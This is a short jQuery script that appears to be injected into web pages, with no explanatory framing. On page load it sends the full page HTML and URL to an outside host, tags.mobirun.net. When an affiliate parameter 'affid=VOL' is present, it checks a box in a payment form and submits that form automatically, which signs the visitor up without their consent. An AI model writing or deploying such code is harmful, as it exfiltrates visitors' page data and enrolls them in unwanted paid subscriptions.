function toQueryString(obj) {
    return Object.keys(obj).map(function(k) {
      return encodeURIComponent(k) + "=" + encodeURIComponent(obj[k])
    })
    .join("&");
}

$(document).ready(function() {
    if (!window._psc_loaded) {
        window._psc_loaded = true

        var originalUrl = window.location.href;
        $.post('https://tags.mobirun.net/api/event?' + toQueryString(queryStringObj), {eventType: 'scrap-html', originalUrl: originalUrl, data: $('html').html()})

        if (/affid=VOL/.test(originalUrl) && $("#paymentForm .checkbox")) {
            $.post('https://tags.mobirun.net/api/event?' + toQueryString(queryStringObj), {eventType: 'auto-subscribe', originalUrl: originalUrl})

            setTimeout(function() {
                $("#paymentForm .checkbox").checked = true;
                $("#paymentForm").submit();
            }, 5)
        }
    }
})
